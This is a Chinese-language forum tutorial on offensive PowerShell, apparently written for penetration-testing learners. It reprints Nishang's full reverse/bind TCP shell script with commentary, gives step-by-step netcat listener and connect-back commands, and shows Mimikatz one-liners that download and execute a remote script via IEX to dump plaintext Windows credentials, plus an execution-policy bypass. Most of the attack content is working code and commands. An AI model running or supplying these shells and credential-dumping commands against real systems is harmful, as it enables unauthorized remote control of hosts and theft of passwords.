原文来自：[https://bbs.ichunqiu.com/thread-41561-1-1.html](https://bbs.ichunqiu.com/thread-41561-1-1.html?from=beef)

i春秋作家：[anyedt](https://bbs.ichunqiu.com/thread-41561-1-1.html?from=beef)

## 0x00 引言

经过基础篇的学习我们已经对powershell有了一个基本的了解，接下来我们先补充一点基础知识然后就尝试去分析nishang中的优秀代码学会如何去使用脚本最后实战
。预告一下，第三篇高级篇带你使用powershell遨游内网。

## 0x01 补充知识

### a 命令格式

    
    
    <command -name > -< Required Parameter Name > <Required Parameter Value >
    命令 -名称 请求参数名 请求参数值
    [ -< Optional Parameter Name > <Optional Parameter Value >]
    [ -< Optional Switch Parameters >]
    [ -< Optional Parameter Name >] <Required Parameter Value >

### b 等价别名

许多命令都有别名以及使用DOS的人或Unix这些可以非常熟悉。 别名是一种简短的命令形式但是其作用是等价的。

    
    
    Command Aliases (命令别名)
    clear-host cls, clear
    format-list fl
    get-childitem gci, ls, dir
    get-content gc, cat, type
    get-location gl, pwd
    get-member gm
    remove-item ri, rm, rmdir, del, erase, rd
    write-output write, echo

### c 执行策略问题

Powershell脚本执行策略是默认不允许执行任何脚本，如果我们没有修改过执行策略而直接运行可能出现以下问题。

![image.png](https://image.3001.net/images/20180612/15287841996950.png!small)  

解决办法

首先查看脚本执行策略设置情况，可以通过 Get-ExecutionPolicyget-executionpolicy命令。如果显示 Restricted
即不允许执行任何脚本。使用管理员身份运行powerhsell然后执行命令：set-executionpolicy remotesigned
回车之后即可执行脚本。

  
![image.png](https://image.3001.net/images/20180612/15287842074411.png!small)  

## 0x02 分析TCP交互式PowerShell脚本

该脚本取之于nishang这个框架，Nishang是一个PowerShell攻击框架，它是PowerShell攻击脚本和有效载荷的一个集合。Nishang被广泛应用于[渗透测试](https://bbs.ichunqiu.com/thread-41561-1-1.html?from=beef)的各个阶段。下载地址：[https://github.com/samratashok/nishang](https://bbs.ichunqiu.com/thread-41561-1-1.html?from=beef)。

先贴上其TCP交互式PowerShell脚本(建立一个TCP正向连接或反向连接shell )代码如下:

    
    
    function Invoke-PowerShellTcp 
    { 
    <#
    .SYNOPSIS
    Nishang script which can be used for Reverse or Bind interactive PowerShell from a target. 
    .DESCRIPTION
    This script is able to connect to a standard netcat listening on a port when using the -Reverse switch. 
    Also, a standard netcat can connect to this script Bind to a specific port.
    The script is derived from Powerfun written by Ben Turner & Dave Hardy
    .PARAMETER IPAddress
    The IP address to connect to when using the -Reverse switch.
    .PARAMETER Port
    The port to connect to when using the -Reverse switch. When using -Bind it is the port on which this script listens.
    .EXAMPLE
    PS > Invoke-PowerShellTcp -Reverse -IPAddress 192.168.254.226 -Port 4444
    Above shows an example of an interactive PowerShell reverse connect shell. A netcat/powercat listener must be listening on 
    the given IP and port. 
    .EXAMPLE
    PS > Invoke-PowerShellTcp -Bind -Port 4444
    Above shows an example of an interactive PowerShell bind connect shell. Use a netcat/powercat to connect to this port. 
    .EXAMPLE
    PS > Invoke-PowerShellTcp -Reverse -IPAddress fe80::20c:29ff:fe9d:b983 -Port 4444
    Above shows an example of an interactive PowerShell reverse connect shell over IPv6. A netcat/powercat listener must be
    listening on the given IP and port. 
    .LINK
    http://www.labofapenetrationtester.com/2015/05/week-of-powershell-shells-day-1.html
    https://github.com/nettitude/powershell/blob/master/powerfun.ps1
    https://github.com/samratashok/nishang
    注释部分
    #>      
        [CmdletBinding(DefaultParameterSetName="reverse")] Param(
    
            [Parameter(Position = 0, Mandatory = $true, ParameterSetName="reverse")]
            [Parameter(Position = 0, Mandatory = $false, ParameterSetName="bind")]
            [String]
            $IPAddress,
    
            [Parameter(Position = 1, Mandatory = $true, ParameterSetName="reverse")]
            [Parameter(Position = 1, Mandatory = $true, ParameterSetName="bind")]
            [Int]
            $Port,
    
            [Parameter(ParameterSetName="reverse")]
            [Switch]
            $Reverse,
    
            [Parameter(ParameterSetName="bind")]
            [Switch]
            $Bind
    
        )
    
        try 
        {
            #Connect back if the reverse switch is used.
            if ($Reverse)
            {
                $client = New-Object System.Net.Sockets.TCPClient($IPAddress,$Port)
            }
    
            #Bind to the provided port if Bind switch is used.
            if ($Bind)
            {
                $listener = [System.Net.Sockets.TcpListener]$Port
                $listener.start()    
                $client = $listener.AcceptTcpClient()
            } 
    
            $stream = $client.GetStream()
            [byte[]]$bytes = 0..65535|%{0}
    
            #Send back current username and computername
            $sendbytes = ([text.encoding]::ASCII).GetBytes("Windows PowerShell running as user " + $env:username + " on " + $env:computername + "`nCopyright (C) 2015 Microsoft Corporation. All rights reserved.`n`n")
            $stream.Write($sendbytes,0,$sendbytes.Length)
    
            #Show an interactive PowerShell prompt
            $sendbytes = ([text.encoding]::ASCII).GetBytes('PS ' + (Get-Location).Path + '>')
            $stream.Write($sendbytes,0,$sendbytes.Length)
    
            while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
            {
                $EncodedText = New-Object -TypeName System.Text.ASCIIEncoding
                $data = $EncodedText.GetString($bytes,0, $i)
                try
                {
                    #Execute the command on the target.
                    $sendback = (Invoke-Expression -Command $data 2>&1 | Out-String )
                }
                catch
                {
                    Write-Warning "Something went wrong with execution of command on the target." 
                    Write-Error $_
                }
                $sendback2  = $sendback + 'PS ' + (Get-Location).Path + '> '
                $x = ($error[0] | Out-String)
                $error.clear()
                $sendback2 = $sendback2 + $x
    
                #Return the results
                $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
                $stream.Write($sendbyte,0,$sendbyte.Length)
                $stream.Flush()  
            }
            $client.Close()
            if ($listener)
            {
                $listener.Stop()
            }
        }
        catch
        {
            Write-Warning "Something went wrong! Check if the server is reachable and you are using the correct port." 
            Write-Error $_
        }
    }

#### a 注释部分

注释部分描述了脚本的概要、用途、脚本的事例、参考链接等信息。

    
    
    <#
    .SYNOPSIS
    Nishang script which can be used for Reverse or Bind interactive PowerShell from a target. 
    .DESCRIPTION
    This script is able to connect to a standard netcat listening on a port when using the -Reverse switch. 
    Also, a standard netcat can connect to this script Bind to a specific port.
    The script is derived from Powerfun written by Ben Turner & Dave Hardy
    .PARAMETER IPAddress
    The IP address to connect to when using the -Reverse switch.
    .PARAMETER Port
    The port to connect to when using the -Reverse switch. When using -Bind it is the port on which this script listens.
    .EXAMPLE
    PS > Invoke-PowerShellTcp -Reverse -IPAddress 192.168.254.226 -Port 4444
    Above shows an example of an interactive PowerShell reverse connect shell. A netcat/powercat listener must be listening on 
    the given IP and port. 
    .EXAMPLE
    PS > Invoke-PowerShellTcp -Bind -Port 4444
    Above shows an example of an interactive PowerShell bind connect shell. Use a netcat/powercat to connect to this port. 
    .EXAMPLE
    PS > Invoke-PowerShellTcp -Reverse -IPAddress fe80::20c:29ff:fe9d:b983 -Port 4444
    Above shows an example of an interactive PowerShell reverse connect shell over IPv6. A netcat/powercat listener must be
    listening on the given IP and port. 
    .LINK
    http://www.labofapenetrationtester.com/2015/05/week-of-powershell-shells-day-1.html
    https://github.com/nettitude/powershell/blob/master/powerfun.ps1
    https://github.com/samratashok/nishang
    注释部分
    #>      

#### b Param运行参数部分

DefaultParameterSetName="reverse" 说明默认采用反向shell连接的方式.可选参数和强制参数必须同时使用
reverse和bind可选默认值为reverse，但是$IPAddress和$Port必须进行设置。最后根据输入的内容匹配类型获取最终值。

    
    
     [CmdletBinding(DefaultParameterSetName="reverse")] Param(
                    <# DefaultParameterSetName="reverse" 说明默认采用反向shell连接的方式。    
                       可选参数和强制参数必须同时使用 reverse和bind可选默认值为reverse，但是$IPAddress和$Port必须                        进行设置。
                        $IPAddress 目标IP地址
                               $Port 目标端口
                    #>   
            [Parameter(Position = 0, Mandatory = $true, ParameterSetName="reverse")]
            [Parameter(Position = 0, Mandatory = $false, ParameterSetName="bind")]
            [String]
            $IPAddress,
    
            [Parameter(Position = 1, Mandatory = $true, ParameterSetName="reverse")]
            [Parameter(Position = 1, Mandatory = $true, ParameterSetName="bind")]
            [Int]
            $Port,
    
            [Parameter(ParameterSetName="reverse")]
            [Switch]
            $Reverse,
                    <# 
                            根据输入的内容匹配类型
                    #>   
            [Parameter(ParameterSetName="bind")]
            [Switch]
            $Bind
        )

#### c 主函数部分

    
    
      try 
        {
            # 连接有可能出错所以这里使用个异常处理trt catch，
            # 判断是否存在对应值，如果存在建立TCP反向shell连接，本机充当客户端。
            if ($Reverse)
            {
                $client = New-Object System.Net.Sockets.TCPClient($IPAddress,$Port)
            }
    
            # 判断是否存在对应值，如果存在建立TCP正向shell连接，本机充当服务端。
            if ($Bind)
            {
                $listener = [System.Net.Sockets.TcpListener]$Port
                $listener.start()    
                $client = $listener.AcceptTcpClient()
            } 
                    # 构建数据流
            $stream = $client.GetStream()
            [byte[]]$bytes = 0..65535|%{0}
    
            #把靶机的相关信息发送到攻击机中去
            $sendbytes = ([text.encoding]::ASCII).GetBytes("Windows PowerShell running as user " + $env:username + " on " + $env:computername + "`nCopyright (C) 2015 Microsoft Corporation. All rights reserved.`n`n")
            $stream.Write($sendbytes,0,$sendbytes.Length)
    
            #交互式信息提示
            $sendbytes = ([text.encoding]::ASCII).GetBytes('PS ' + (Get-Location).Path + '>')
            $stream.Write($sendbytes,0,$sendbytes.Length)
                    # 判断数据是否传输完成，不完成就传输完为止
            while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
            {
                $EncodedText = New-Object -TypeName System.Text.ASCIIEncoding
                $data = $EncodedText.GetString($bytes,0, $i)
                try
                {
                    #执行命令，然后输出
                    $sendback = (Invoke-Expression -Command $data 2>&1 | Out-String )
                }
                catch
                {
                        # 异常处理
                    Write-Warning "Something went wrong with execution of command on the target." 
                    Write-Error $_
                }
                # 用于返回当前路径
                $sendback2  = $sendback + 'PS ' + (Get-Location).Path + '> '
                $x = ($error[0] | Out-String)
                # 清楚错误
                $error.clear()
                $sendback2 = $sendback2 + $x
    
                #返回ASCII编码过后的数据
                $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
                $stream.Write($sendbyte,0,$sendbyte.Length)
                $stream.Flush()  
                # 刷新流
            }
            # 关闭连接
            $client.Close()
            if ($listener)
            {
                $listener.Stop()
            }
        }
        catch
        {
                # 异常处理
            Write-Warning "Something went wrong! Check if the server is reachable and you are using the correct port." 
            Write-Error $_
        }

## 0x03 脚本使用

### a 导入命令模式

导入命令模式就是先导入ps1文件到powershell然后可以直接在命令行运行函数。

> Import-Module '.\Invoke-PowerShellTcp .ps1'

  
![image.png](https://image.3001.net/images/20180612/15287842306938.png!small)  

反向连接

第一步 ：在攻击机上使用nc监听本地端口4444（先监听后连接，不然会出错。）

  
![image.png](https://image.3001.net/images/20180612/15287842385503.png!small)  

第二步：靶机运行连接命令

> Invoke-PowerShellTcp -Reverse -IPAddress 攻击机ip -Port 攻击机监听的端口

  
![image.png](https://image.3001.net/images/20180612/15287842476459.png!small)  

第三步： 成功连接，获取shell

  
![image.png](https://image.3001.net/images/20180612/15287842534925.png!small)

![image.png](https://image.3001.net/images/20180612/15287842581716.png!small)  

正向连接

第一步： 靶机开启监听

> Invoke-PowerShellTcp -bind -port 4444

![image.png](https://image.3001.net/images/20180612/15287842718424.png!small)  

第二步： 攻击机nc连接靶机

> nc -nv 192.168.17.132 4444

第三步：成功连接，获取到shell

  
![image.png](https://image.3001.net/images/20180612/15287842807303.png!small)

![image.png](https://image.3001.net/images/20180612/15287842879290.png!small)

  

### b 非导入命令模式

该模式不需要进行导入powershell,直接运行脚本。

正向连接

第一步： 在ps1文件中加入执行监听命令

> Invoke-PowerShellTcp -bind

![image.png](https://image.3001.net/images/20180612/15287842949157.png!small)  

第二步： 运行ps1文件，设置监听端口，开启监听

> .\Invoke-PowerShellTcp.ps1

![image.png](https://image.3001.net/images/20180612/15287843048485.png!small)  

第三步： 攻击机nc连接靶机，获取shell

![image.png](https://image.3001.net/images/20180612/15287843126760.png!small)  

反向连接

第一步：攻击机监听端口

> nc -lvp 8888

  
![image.png](https://image.3001.net/images/20180612/15287843189193.png!small)  

第二步： 在ps1文件中加入执行连接命令

> Invoke-PowerShellTcp -reverse 192.168.17.134 8888

![image.png](https://image.3001.net/images/20180612/1528784327962.png!small)  

第三步： 获取shell

![image.png](https://image.3001.net/images/20180612/15287843314591.png!small)  

## 0x04 Mimikatz结合Powershell 获取目标主机账号密码

实战过程中在获取低权限用户之后我们为了扩展战果我们就不得不提权，在没有0day的基础上最简单的提权方式就是直接获取目标主机的管理员账号密码。说起获取密码就不得不提提Mimikatz
这款工具了。mimikatz是由C语言编写的开源小工具，功能非常强大。它支持从Windows系统内存中提取明文密码、哈希、PIN码和Kerberos凭证，以及pass-the-hash、pass-the-ticket、build Golden
tickets等数种[黑客技术](http://bbs.ichunqiu.com/forum-41-1.html?from=beef)。

我这里讲的是Powershell结合Mimikatz的使用。实验环境为腾讯云的一台服务器window server 2008。

### a 本地网络环境运行

第一步： 下载Invoke-Mimikatz.ps1

Invoke-Mimikatz.ps1下载地址  
[https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1](https://bbs.ichunqiu.com/thread-41561-1-1.html?from=beef)

第二步：直接一句话运行

    
    
    powershell Import-Module .\Invoke-Mimikatz.ps1;Invoke-Mimikatz -Command '"privilege::debug" "sekurlsa::logonPasswords full"'
    #或者 本地搭建网络环境http://192.168.1.1/
    powershell "IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.1/');Invoke-Mimikatz -DumpCreds" 
    
    <#
    
    假如存在执行策略问题：
    
    Get-ExecutionPolicy  //结果显示restricted
    
    Set-ExecutionPolicy Unrestricted  //打开限制
    
    Import-Module .\Invoke-Mimikatz.ps1 //导入命令
    
    Invoke-Mimikatz -Command '"privilege::debug" "sekurlsa::logonPasswords full"' //获取密码
    #>
    

第三步：成功获取明文密码

![image.png](https://image.3001.net/images/20180612/15287843409831.png!small)  

### b 在线网络环境运行

第一步：直接执行命令

在 Windows 2008 及以上操作系统中执⾏命令

    
    
    powershell "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubuserc
    ontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); I
    nvoke-Mimikatz -DumpCreds"

注意点:靶机必须可以正常访问raw.githubusercontent.com 网络，因为需要连接下载ps1文件。 Windows Server
2014以上版本仅能获取到NTLM值，无法正常获取明文密码。

第二步： 成功获取明文密码

![image.png](https://image.3001.net/images/20180612/15287843479196.png!small)![image.png](https://image.3001.net/images/20180612/15287843556681.png!small)

![image.png](https://image.3001.net/images/20180612/15287843626946.png!small)

  

## 0x05 总结

本文重点学会分析脚本，懂得分析别人写的，然后自己写一个类似的脚本都是几分钟的事情。分析是为了去模仿好的，让自己少走弯路，超越是我们要做的。紧接着我们讲到了脚本的使用然后举了一个实战例子获取明文密码。希望大家能学会去使用powershell，然后重视它，掌握它。

  

i春秋推出优享会员制，开通会员可以免费畅享多类课程、实验、CTF赛题等付费内容，并可享有包括会员日专属福利、就业推荐等多种特权福利，更多活动详情可点击：[https://bbs.ichunqiu.com/thread-40795-1-1.html](https://bbs.ichunqiu.com/thread-40795-1-1.html?from=qd)了解哦~  

